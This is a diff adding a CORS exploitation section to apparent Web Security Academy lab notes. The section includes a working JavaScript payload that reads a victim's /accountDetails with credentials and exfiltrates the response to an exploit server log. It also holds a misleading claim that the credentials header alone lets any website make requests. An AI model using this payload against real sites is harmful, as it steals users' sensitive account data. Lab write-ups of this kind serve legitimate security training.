@@ -3452,6 +3452,32 @@ bruteforce$index:login(input:{password: "$password", username: "carlos"}) {
 [Trusted insecure protocols](#trusted-insecure-protocols)  
 [Null origin trusted](#null-origin-trusted)  
 
+### Easy test
+
+- GET `/accountDetails` retrieves sensitive data and server responds with header :
+
+```
+Access-Control-Allow-Credentials: true
+``` 
+
+If this header is `true`, it means that requests can be made from any website.
+
+- Craft a JS payload and deliver it to victim. When victim clicks, the exploit server will generate a request to `/accountDetails` and append the response to `/log` request:
+
+```
+<script>
+    var req = new XMLHttpRequest();
+    req.onload = reqListener;
+    req.open('get','YOUR-LAB-ID.web-security-academy.net/accountDetails',true);
+    req.withCredentials = true;
+    req.send();
+
+    function reqListener() {
+        location='/log?key='+this.responseText;
+    };
+</script>
+```
+
 ### Trusted insecure protocols  
 
 >***Identify*** in the `source code` the account details are requested with AJAX request and it contains the user session cookie in the response.  
